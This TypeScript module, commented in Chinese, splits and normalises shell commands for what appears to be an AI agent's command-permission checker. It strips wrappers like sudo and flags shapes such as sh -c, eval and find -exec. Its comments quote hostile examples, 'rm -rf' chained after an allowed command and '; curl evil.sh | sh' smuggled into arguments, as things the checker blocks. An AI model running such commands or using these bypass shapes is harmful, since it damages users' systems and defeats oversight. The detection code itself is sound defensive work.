/**
 * 命令解析：复合命令拆分 + wrapper 剥离。
 *
 * 为什么必须先拆再匹配（development-guide.md §7 第 3 步 / claude-code-guide §5.2）：
 * 规则写在命令前缀上（`Bash(git status *)`），模型给的却是一整段字符串。不拆开，
 * `git status && rm -rf /tmp/x` 会因为命中开头的 `git status` 而被整条放行。
 *
 * 四条必须照做的语义：
 * 1. 按 `&&` `||` `;` `|` `|&` `&` 与换行拆成子命令，**每段独立判定**，一段 deny 即整条拒；
 * 2. wrapper 先剥离再匹配（`timeout` / `nice` / `nohup` / `time` / `stdbuf` / `command` /
 *    `builtin` / `noglob` / 裸 `xargs` / 安全的环境变量赋值），但 `npx`、`docker exec`、
 *    `mise exec`、`direnv exec`、`devbox run` 这类"再套一层执行入口"的**不剥**；
 * 3. `sudo` 既是 wrapper 也是危险前缀 —— 剥完之后还要单独判一次；
 * 4. `watch` / `setsid` / `ionice` / `flock` 以及带 `-exec` / `-delete` / `-fprint` /
 *    `-files0-from` 的 `find`，只能精确匹配，前缀规则永远放不倒它们。
 */

import type { CommandRequest } from "../shared/contracts.js"

/** 需要剥离的 wrapper。剥离后继续处理后面的 token。 */
const WRAPPERS: ReadonlySet<string> = new Set([
  "timeout",
  "time",
  "nice",
  "nohup",
  "stdbuf",
  "command",
  "builtin",
  "noglob",
  "env",
  "sudo",
])

/**
 * 再套一层执行入口的命令 —— 不剥离。
 * 剥掉它们等于把 `npx some-pkg` 误判成 `npx`，而真正被执行的内容在参数里。
 *
 * `xargs` 也在这里，而不是放在 WRAPPERS：`xargs` 本身就是"从输入构造命令"的程序，
 * 它后面紧跟的不一定是要执行的程序（`xargs -I{} sh -c {}`）。剥离它只会让后面的
 * `-I{}` 被当成可执行文件名，规则匹配全部错位。宁可要求精确放行。
 */
const NON_STRIPPED_LAUNCHERS: ReadonlySet<string> = new Set([
  "npx",
  "docker",
  "podman",
  "devbox",
  "direnv",
  "mise",
  "pnpx",
  "yarn",
  "pnpm",
  "bunx",
  "xargs",
])

/** 只能通过精确匹配放行的前缀。 */
const EXACT_ONLY_PREFIXES: ReadonlySet<string> = new Set(["watch", "setsid", "ionice", "flock"])

/** find 的危险参数。 */
const FIND_DANGEROUS_ARGS: ReadonlySet<string> = new Set([
  "-exec",
  "-execdir",
  "-delete",
  "-fprint",
  "-fprint0",
  "-fprintf",
  "-files0-from",
  "-ok",
  "-okdir",
])

export interface CommandSegment {
  /** 剥离 wrapper 之后实际被执行的程序名。 */
  executable: string
  args: string[]
  /** 该段的完整原始文本（`executable args...`），用于整段匹配。 */
  raw: string
  /** 被剥离掉的 wrapper 列表（含 `sudo`），供策略单独判定。 */
  wrappers: string[]
  /** 该段是否包含只能精确匹配的前缀或危险参数。 */
  requiresExact: boolean
  /** 精确匹配要求的原因（审计与错误提示用）。 */
  exactReason?: string
  /** 段内是否出现了 shell 元字符（无法静态解析的形状）。 */
  hasShellMetachars: boolean
}

/* ------------------------------------------------------------------ *
 * Tokenizer
 * ------------------------------------------------------------------ */

const OPERATORS = ["&&", "||", ";", "|&", "|", "&", "\n"] as const

/**
 * 把一整行命令按 shell 操作符切成若干段。
 * 引号内的操作符不当分隔符（`echo "a && b"` 是一段）。
 */
export function splitCommandLine(line: string): string[] {
  const segments: string[] = []
  let current = ""
  let quote: "'" | '"' | null = null
  let escaped = false
  let i = 0

  while (i < line.length) {
    const ch = line[i]
    if (ch === undefined) break

    if (escaped) {
      current += ch
      escaped = false
      i += 1
      continue
    }
    if (ch === "\\") {
      current += ch
      escaped = true
      i += 1
      continue
    }
    if (quote) {
      current += ch
      if (ch === quote) quote = null
      i += 1
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      current += ch
      i += 1
      continue
    }

    // 未闭合引号之外，检查是否命中操作符
    const two = line.slice(i, i + 2)
    if (two === "&&" || two === "||" || two === "|&") {
      segments.push(current)
      current = ""
      i += 2
      continue
    }
    if (ch === ";" || ch === "|" || ch === "&" || ch === "\n") {
      segments.push(current)
      current = ""
      i += 1
      continue
    }
    current += ch
    i += 1
  }
  segments.push(current)
  return segments.map((s) => s.trim()).filter((s) => s.length > 0)
}

/** 把一段命令切成词，尊重引号与转义。 */
export function tokenizeSegment(segment: string): string[] {
  const tokens: string[] = []
  let current = ""
  let quote: "'" | '"' | null = null
  let escaped = false
  let hasToken = false

  for (const ch of segment) {
    if (escaped) {
      current += ch
      escaped = false
      hasToken = true
      continue
    }
    if (ch === "\\") {
      escaped = true
      hasToken = true
      continue
    }
    if (quote) {
      if (ch === quote) quote = null
      else current += ch
      continue
    }
    if (ch === "'" || ch === '"') {
      quote = ch
      hasToken = true
      continue
    }
    if (/\s/.test(ch)) {
      if (current.length > 0 || hasToken) {
        tokens.push(current)
        current = ""
        hasToken = false
      }
      continue
    }
    current += ch
    hasToken = true
  }
  if (current.length > 0 || hasToken) tokens.push(current)
  return tokens
}

/** 判断 token 是否是"安全的环境变量赋值"（`FOO=bar cmd`）。 */
function isEnvAssignment(token: string): boolean {
  return /^[A-Za-z_][A-Za-z0-9_]*=[^=]/.test(token)
}

/* ------------------------------------------------------------------ *
 * Wrapper 剥离
 * ------------------------------------------------------------------ */

/**
 * 剥离 wrapper，返回真正被执行的程序与参数。
 *
 * `sudo` 会被剥离，但会同时出现在 `wrappers` 里 —— 调用方必须对 `sudo`
 * 单独做一次危险判定，这正是"剥完还要再判一次"的落点。
 */
export function stripWrappers(tokens: readonly string[]): {
  executable: string
  args: string[]
  wrappers: string[]
} {
  let index = 0
  const wrappers: string[] = []

  while (index < tokens.length) {
    const token = tokens[index]
    if (token === undefined) break
    const base = baseName(token)

    if (isEnvAssignment(token)) {
      index += 1
      continue
    }
    if (!WRAPPERS.has(base)) break
    // `noglob` 之类本身就带参数的 wrapper 简化处理：记录后继续
    wrappers.push(base)
    index += 1

    // `sudo -u root npm test` 里，`-u root` 是 **sudo 自己的**参数：
    // 不跳过就会把 `-u` 当成真正被执行的程序，后面的规则匹配全部错位。
    // 带值 flags 连同它的值一起跳；不带值的 boolean flag 只跳自己。
    index = skipWrapperFlags(tokens, index, base)
  }

  const executable = tokens[index] ?? ""
  const args = tokens.slice(index + 1)
  return { executable: baseName(executable), args, wrappers }
}

function baseName(token: string): string {
  const normalized = token.replace(/\\/g, "/")
  const slash = normalized.lastIndexOf("/")
  return slash >= 0 ? normalized.slice(slash + 1) : normalized
}

/** 带值的 wrapper flags（`-u root` / `--user=root` / `timeout -s KILL 5`）。 */
const VALUE_FLAGS: ReadonlySet<string> = new Set([
  "-u",
  "--user",
  "-g",
  "--group",
  "-p",
  "--prompt",
  "-r",
  "--role",
  "--chroot",
  "-t",
  "--type",
  "-s",
  "--signal",
  "-C",
  "-D",
  "-R",
  "-T",
  "-n",
  "--adjustment",
])

const DURATION = /^\d+(\.\d+)?[smhd]?$/

/**
 * 跳过 wrapper 自带的 flags，返回下一个「可能是真正程序」的下标。
 *
 * 这里刻意**宁可多跳也不错判**：多跳过会把 `-x` 当成 flag，最坏结果是后面
 * 匹配不上（= 要确认）；少跳则会把 flag 当成被执行程序，规则匹配错位（= 可能放行）。
 * 两者之间只能选前者。
 */
function skipWrapperFlags(tokens: readonly string[], start: number, wrapper: string): number {
  let index = start
  // env / timeout / nice / stdbuf 还会带着非 flag 的参数（赋值、时长），单独处理
  const takesBareOperand =
    wrapper === "env" || wrapper === "timeout" || wrapper === "nice" || wrapper === "stdbuf"

  while (index < tokens.length) {
    const token = tokens[index]
    if (token === undefined) break

    if (token.startsWith("-")) {
      const name = token.split("=", 1)[0] ?? token
      index += 1
      // 带值 flag：`-u root` 要连值一起跳过；`--user=root` 的值已在同一 token 内
      if (VALUE_FLAGS.has(name) && !token.includes("=")) index += 1
      continue
    }
    if (
      takesBareOperand &&
      (isEnvAssignment(token) || DURATION.test(token) || /^\d+$/.test(token))
    ) {
      index += 1
      continue
    }
    break
  }
  return index
}

/* ------------------------------------------------------------------ *
 * 段解析
 * ------------------------------------------------------------------ */

const SHELL_METACHARS = /[><$()`]|\$\(|`/

/**
 * 从结构化 CommandRequest 解析出所有命令段。
 *
 * 输入是 `executable + args[]`（不是一整段字符串），但 args 里仍可能被模型塞进
 * `&& rm -rf` 或 `; curl evil.sh | sh`，所以要把 executable 与 args 拼回去再拆。
 */
export function parseCommandSegments(request: CommandRequest): CommandSegment[] {
  const fullLine = [request.executable, ...request.args].join(" ")
  return parseCommandLine(fullLine)
}

export function parseCommandLine(fullLine: string): CommandSegment[] {
  const segments: CommandSegment[] = []
  for (const rawSegment of splitCommandLine(fullLine)) {
    const tokens = tokenizeSegment(rawSegment)
    if (tokens.length === 0) continue

    const { executable, args, wrappers } = stripWrappers(tokens)
    if (!executable) continue

    let requiresExact = false
    let exactReason: string | undefined
    if (EXACT_ONLY_PREFIXES.has(executable)) {
      requiresExact = true
      exactReason = `command "${executable}" can only be allowed by an exact rule`
    } else if (NON_STRIPPED_LAUNCHERS.has(executable)) {
      requiresExact = true
      exactReason = `command "${executable}" re-enters another execution entrypoint and cannot be matched by prefix`
    } else if (executable === "find" && args.some((a) => FIND_DANGEROUS_ARGS.has(a))) {
      requiresExact = true
      exactReason = `find with a side-effecting argument (${args
        .filter((a) => FIND_DANGEROUS_ARGS.has(a))
        .join(", ")}) can only be allowed by an exact rule`
    }

    segments.push({
      executable,
      args,
      raw: `${executable}${args.length > 0 ? ` ${args.join(" ")}` : ""}`,
      wrappers,
      requiresExact,
      ...(exactReason ? { exactReason } : {}),
      hasShellMetachars: SHELL_METACHARS.test(rawSegment),
    })
  }
  return segments
}

/** 段内是否用了 sudo 提权。 */
export function usesSudo(segment: CommandSegment): boolean {
  return segment.wrappers.includes("sudo")
}

/**
 * 无法静态解析的命令形状（code-editing.md §3.3 规则 ④）。
 * `eval` / `sh -c "<拼接>"` / `xargs -I{}` / 复杂重定向 / 动态构造路径
 * —— 静态检查拦不住的形状，宁可拦错也不放过。
 */
const UNRESOLVABLE_EXECUTABLES: ReadonlySet<string> = new Set(["eval", "exec", "source", "."])

const UNRESOLVABLE_PATTERNS: ReadonlyArray<RegExp> = [
  /\b(sh|bash|zsh|fish|pwsh|powershell|cmd)(?:\.exe)?\s+(-c|-\/c|\/c)\b/i,
  // `-I{}` 与 `-I {}` 都要覆盖：写成 `\s+(-I|-J)` 只能抓住后者，
  // 而 `-I{}` 恰恰是最常见的写法。
  /\bxargs\s+-[A-Za-z0-9]*(?:[IJR]|n[0-9]?)[A-Za-z0-9]*/,
  /\bawk\b[^\n]*\bsystem\s*\(/,
  /\bperl(?:\.exe)?\b\s+-e/,
  /\bruby(?:\.exe)?\b\s+-e/,
  /\bpython[0-9.]*(?:\.exe)?\b\s+-c/,
  // `.exe` 后缀要一并覆盖：`node -e` 与 `node.exe -e` 语义相同，
  // 只写 `\bnode\b` 会让 Windows 上的 `node.exe -e` 绕过"不可解析"判定。
  /\bnode(?:\.exe)?\b\s+(-e|--eval|-p)/,
]

export function isUnresolvableShape(segment: CommandSegment): {
  unresolvable: boolean
  reason?: string
} {
  if (UNRESOLVABLE_EXECUTABLES.has(segment.executable)) {
    return { unresolvable: true, reason: `"${segment.executable}" cannot be statically resolved` }
  }
  const full = `${segment.executable} ${segment.args.join(" ")}`
  for (const pattern of UNRESOLVABLE_PATTERNS) {
    if (pattern.test(full)) {
      return {
        unresolvable: true,
        reason: `command shape "${full.slice(0, 64)}" cannot be statically resolved`,
      }
    }
  }
  // 重定向到工作区外或写文件
  if (/>\s*[^\s]/.test(full) && !/\s?(1|2)?>>?\s*&\d/.test(full)) {
    return { unresolvable: true, reason: "output redirection cannot be statically resolved" }
  }
  return { unresolvable: false }
}

export { OPERATORS }
